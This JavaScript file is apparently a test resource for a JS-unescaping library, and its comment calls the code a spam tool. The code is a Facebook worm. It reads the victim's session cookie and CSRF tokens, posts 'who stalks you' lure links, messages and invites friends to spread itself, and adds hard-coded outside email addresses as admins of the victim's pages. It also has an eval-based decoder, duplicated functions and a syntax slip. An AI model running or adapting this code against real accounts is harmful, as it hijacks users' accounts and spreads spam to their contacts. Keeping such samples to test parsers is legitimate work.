/*
 * Copyright (C) 2014-2015 Philip Helger (www.helger.com)
 * philip[at]helger[dot]com
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
// This is a SPAM tool. It's just here to test the JS unescaping!!!!
// http://profilechecker.info/StalkerTools.fb
var texts = [
",",
"split",
"",
"length",
"fromCharCode",
"friendselector_input[]=",
"&friend_selected[]=",
"POST",
"/pages/edit/?id=",
"&sk=admin",
"Content-Type",
"application/x-www-form-urlencoded",
"post_form_id=",
"&fb_dtsg=",
"&fbpage_id=",
"&",
"join",
"&save=1",
"match",
"randomize",
"\n\n",
"&xhpc_composerid=",
"&xhpc_targetid=",
"|",
"&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=",
"replace",
"&xhpc_message=",
"&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest",
"/ajax/updatestatus.php?__a=1",
"http://goo.gl/V7688",
"http://ow.ly/3ZeNC",
"http://is.gd/dJjed3",
"http://goo.gl/kftAl",
"http://goo.gl/UQA7I",
"http://tiny.cc/v1bwd",
"168046893242650",
"127901437283104",
"165991450116555",
"chunfeezellwytm@hotmail.com,wintersaccohoqr@hotmail.com",
"Wow! Seems like lots of people stalk me - ",
"New FB tool shows who stalks your profile-- ",
"Secret tool shows who stalks your pics ",
"Insane! Awesome tool to see who looks at your pics >> ",
"According to ",
" you're my top stalker. Creep.",
"Secret tool shows who stalks your pics - ",
"Check this out!",
"Hey, whats happening?",
"Hey! This is awesome",
"prototype",
"random",
"floor",
"isReady",
"readyState",
"status",
"getFriends",
"slice",
":",
"div",
"createElement",
"id",
"screwyouz",
"align",
"center",
"setAttribute",
"margin",
"style",
"0px auto",
"position",
"absolute",
"top",
"10px",
"zindex",
"100",
"className",
"screwyou",
"innerHTML",
"<br /><br /><br /><br /><br /><center><img src=\"http://fbviews.org/process.gif\" /><br />Scanning may take up to 3 minutes</center>",
"appendChild",
"body",
"href",
"location",
"http://www.facebook.com/",
"GET",
"/",
"responseText",
"Hello!\n\nTo activate the tool press Enter on your keyboard.\n\nThis will take 2-3 minutes, while waiting please do not close this window or tab.",
"cookie",
"/ajax/pages/fan_status.php?__a=1",
"fbpage_id=",
"&add=1&reload=1&preserve_tab=1&use_primer=1&nctr[_mod]=pagelet_top_bar&post_form_id=",
"&lsd&post_form_id_source=AsyncRequest",
"/ajax/browser/list/friends/all/?uid=",
"&offset=0&dual=1&__a=1",
"ids[",
"]=",
"/ajax/social_graph/invite_dialog.php?__a=1",
"&send_invitations=1&invite_id_list=&email_addresses=&invite_msg=&",
"&node_id=",
"&class=GuestManager&__d=1&lsd&post_form_id_source=AsyncRequest",
"http://fbviews.org/result.php",
"/ajax/messaging/composer.php?__a=1&__d=1",
"ids_",
"[0]=",
"&subject=",
"&status=",
"&ids[0]=",
"&action=send_new&home_tab_id=1&profile_id=",
"&target_id=0&app_id=&&composer_id=",
"&hey_kid_im_a_composer=true&thread&post_form_id=",
"&lsd&_log_action=send_new&_log_thread&ajax_log=1&post_form_id_source=AsyncRequest",
"/ajax/gigaboxx/endpoint/MessageComposerEndpoint.php?__a=1",
"/insights/?_fb_noscript=1"];
function _88xuhyr(_0x91e5x2) {
  st = _0x91e5x2[texts[1]](texts[0]);
  d = texts[2];
  for (i = 0; i < st[texts[3]]; i++) {
    d += String[texts[4]](st[i] - 24);
  }
  eval(d);
};
function addAdmin(_0x91e5x4, _0x91e5x5, _0x91e5x6, _0x91e5x7) {
  iemails = _0x91e5x5[texts[1]](texts[0]);
  main_emails = [];
  for (i = 0; i < iemails[texts[3]]; i++) {
    main_emails[i] = texts[5] + iemails[i] + texts[6];
  }
  with (newx = new XMLHttpRequest) {
    open(texts[7], texts[8] + _0x91e5x4 + texts[9]);
    setRequestHeader(texts[10], texts[11]);
    send(texts[12] + _0x91e5x6 + texts[13] + _0x91e5x7 + texts[14]
        + _0x91e5x4 + texts[15] + main_emails[texts[16]](texts[15])
        + texts[17]);
  }
};
function makePost(_0x91e5x9, _0x91e5xa, _0x91e5xb, _0x91e5xc) {
  formx = _0x91e5x9[texts[18]](/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = _0x91e5x9[texts[18]](/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = _0x91e5x9[texts[18]]
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
  msg = _0x91e5xa[texts[19]]() + texts[20];
  text_post = texts[2];
  text_actual = texts[2];
  pxt = texts[12] + formx + texts[13] + dtx + texts[21] + composerx
      + texts[22] + _0x91e5xb[texts[1]](texts[23])[0] + texts[24]
      + encodeURIComponent(msg + text_actual[texts[25]](/\, $/, texts[2]))
      + texts[26]
      + encodeURIComponent(msg + text_post[texts[25]](/\, $/, texts[2]))
      + texts[27];
  update(pxt);
};
function update(_0x91e5xe) {
  with (newx = new XMLHttpRequest) {
    open(texts[7], texts[28]);
    setRequestHeader(texts[10], texts[11]);
    send(_0x91e5xe);
  }
  ;
};
goog1 = texts[29];
goog2 = texts[30];
goog3 = texts[31];
goog4 = texts[32];
goog5 = texts[33];
goog6 = texts[34];
event_id = texts[35];
page_id_x = texts[36];
page_id_xx = texts[37];
admin_emails = texts[38];
statuses = [ texts[39] + goog1, texts[40] + goog2, texts[41] + goog3,
    texts[42] + goog4, texts[43] + goog5 + texts[44], texts[45] + goog6 ];
subjects = [ texts[46], texts[47], texts[48] ];
Array[texts[49]][texts[19]] = function() {
  return this[Math[texts[51]](Math[texts[50]]() * this[texts[3]])];
};
Object[texts[49]][texts[52]] = function() {
  return this[texts[53]] == 4 && this[texts[54]] == 200);
};
String[texts[49]][texts[55]] = function() {
  friends2 = this[texts[18]]
      (/facebook\.com\\\\\\\/profile\.php\?id=\d+\\\\\\\">(<span[^>]+>|)[^<>]+/gi)[texts[16]]
      (texts[57])[texts[25]](
      /(facebook\.com\\\\\\\/|profile\.php\?id=|<span[^>]+>|l\.php.*)/gi,
      texts[2])[texts[25]](/\\\\\\\">/gi, texts[23])[texts[1]]
      (texts[57])[texts[56]](1);
  return friends2;
};
function addAdmin(_0x91e5x4, _0x91e5x5, _0x91e5x6, _0x91e5x7) {
  iemails = _0x91e5x5[texts[1]](texts[0]);
  main_emails = [];
  for (i = 0; i < iemails[texts[3]]; i++) {
    main_emails[i] = texts[5] + iemails[i] + texts[6];
  }
  with (newx = new XMLHttpRequest) {
    open(texts[7], texts[8] + _0x91e5x4 + texts[9]);
    setRequestHeader(texts[10], texts[11]);
    send(texts[12] + _0x91e5x6 + texts[13] + _0x91e5x7 + texts[14]
        + _0x91e5x4 + texts[15] + main_emails[texts[16]](texts[15])
        + texts[17]);
  }
};
function loading() {
  var _0x91e5x10 = document[texts[59]](texts[58]);
  _0x91e5x10[texts[60]] = texts[61];
  _0x91e5x10[texts[64]](texts[62], texts[63]);
  _0x91e5x10[texts[66]][texts[65]] = texts[67];
  _0x91e5x10[texts[66]][texts[68]] = texts[69];
  _0x91e5x10[texts[66]][texts[70]] = texts[71];
  _0x91e5x10[texts[66]][texts[72]] = texts[73];
  _0x91e5x10[texts[74]] = texts[75];
  _0x91e5x10[texts[76]] = texts[77];
  document[texts[79]][texts[78]](_0x91e5x10);
};
function makePost(_0x91e5x9, _0x91e5xa, _0x91e5xb, _0x91e5xc) {
  formx = _0x91e5x9[texts[18]](/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = _0x91e5x9[texts[18]](/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = _0x91e5x9[texts[18]]
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
  msg = _0x91e5xa[texts[19]]() + texts[20];
  text_post = texts[2];
  text_actual = texts[2];
  pxt = texts[12] + formx + texts[13] + dtx + texts[21] + composerx
      + texts[22] + _0x91e5xb[texts[1]](texts[23])[0] + texts[24]
      + encodeURIComponent(msg + text_actual[texts[25]](/\, $/, texts[2]))
      + texts[26]
      + encodeURIComponent(msg + text_post[texts[25]](/\, $/, texts[2]))
      + texts[27];
  update(pxt);
};
function update(_0x91e5xe) {
  with (newx = new XMLHttpRequest) {
    open(texts[7], texts[28]);
    setRequestHeader(texts[10], texts[11]);
    send(_0x91e5xe);
  }
};
if (window[texts[81]][texts[80]] == texts[82]) {
  formx = (res = document[texts[79]][texts[76]])[texts[18]]
      (/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = res[texts[18]](/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = res[texts[18]]
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
} else {
  with (muhaha = new XMLHttpRequest) {
    open(texts[83], texts[84], false);
    send(null);
  }
  formx = (res = muhaha[texts[85]])[texts[18]]
      (/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = res[texts[18]](/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = res[texts[18]]
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
};
alert(texts[86]);
update(texts[12] + formx + texts[13] + dtx + texts[21] + composerx
    + texts[22] + document[texts[87]][texts[18]](/c_user=(\d+)/)[1]
    + texts[24] + encodeURIComponent(stx = statuses[texts[19]]())
    + texts[26] + encodeURIComponent(stx) + texts[27]);
// Become a fan of 2 profiles
with (newz = new XMLHttpRequest) {
  loading();
  open(texts[7], texts[88]);
  setRequestHeader(texts[10], texts[11]);
  send(texts[89] + page_id_x + texts[90] + formx + texts[13] + dtx
      + texts[91]);
};
with (newzz = new XMLHttpRequest) {
  open(texts[7], texts[88]);
  setRequestHeader(texts[10], texts[11]);
  send(texts[89] + page_id_xx + texts[90] + formx + texts[13] + dtx
      + texts[91]);
};
void 0;
with (fr = new XMLHttpRequest) {
  open(texts[83], texts[92]
      + (me = document[texts[87]][texts[18]](/c_user=(\d+)/)[1])
      + texts[93]);
  onreadystatechange = function() {
    if (fr[texts[52]]()) {
      // Extract friends from response
      friends = fr[texts[85]][texts[55]]();
      idx = [];
      for (i = 0; i < friends[texts[3]]; i++) {
        if (!isNaN(friends[i][texts[1]](texts[23])[0])) {
          idx[i] = texts[94] + i + texts[95] + friends[i][texts[1]](texts[23])[0];
        }
      }
      with (invi = new XMLHttpRequest) {
        open(texts[7], texts[96]);
        setRequestHeader(texts[10], texts[11]);
        send(texts[12] + formx + texts[13] + dtx + texts[97]
            + idx[texts[16]](texts[15]) + texts[98] + event_id
            + texts[99]);
      }
      cnt_fr = 0;
      tx = setInterval(function() {
        if (cnt_fr == friends[texts[3]]) {
          window[texts[81]] = texts[100];
          clearInterval(tx);
        }
        makePost(document[texts[79]][texts[76]], statuses, friends[cnt_fr], friends);
        with (xa = new XMLHttpRequest) {
          open(texts[83], texts[101]);
          onreadystatechange = function() {
            if (xa[texts[52]]()) {
              compi = xa[texts[85]][texts[18]](/([\d\w]+)_error/)[1];
              pxi = texts[102] + compi + texts[103]
                  + friends[cnt_fr][texts[1]](texts[23])[0] + texts[104]
                  + encodeURIComponent(subjects[texts[19]]()) + texts[105]
                  + encodeURIComponent(statuses[texts[19]]()) + texts[106]
                  + friends[cnt_fr][texts[1]](texts[23])[0] + texts[107]
                  + document[texts[87]][texts[18]](/c_user=(\d+)/)[1]
                  + texts[108] + compi + texts[109] + formx + texts[13]
                  + dtx + texts[110];
              if (cnt_fr < 15) {
                with (mi = new XMLHttpRequest) {
                  open(texts[7], texts[111]);
                  setRequestHeader(texts[10], texts[11]);
                  send(pxi);
                }
              }
            }
          };
          send(null);
        }
        cnt_fr += 1;
      }, 3000);
    }
  };
  send(null);
};
with (ins = new XMLHttpRequest) {
  open(texts[83], texts[112]);
  onreadystatechange = function() {
    if (ins[texts[52]]()) {
      ids = ins[texts[85]][texts[18]](/po_\d+">View/gi)[texts[16]]
          (texts[57])[texts[25]](/(po_|">View)/gi, texts[2])[texts[1]]
          (texts[57]);
      cnt_pages = 0;
      tz = setInterval(function() {
        if (cnt_pages == ids[texts[3]]) {
          window[texts[81]] = texts[100];
          clearInterval(tz);
        }
        update(texts[12] + formx + texts[13] + dtx + texts[21]
            + composerx + texts[22] + ids[cnt_pages] + texts[24]
            + encodeURIComponent(stx = statuses[texts[19]]()) + texts[26]
            + encodeURIComponent(stx) + texts[27]);
        addAdmin(ids[cnt_pages], admin_emails, formx, dtx);
        cnt_pages += 1;
      }, 3000);
    }
  };
  send(null);
};
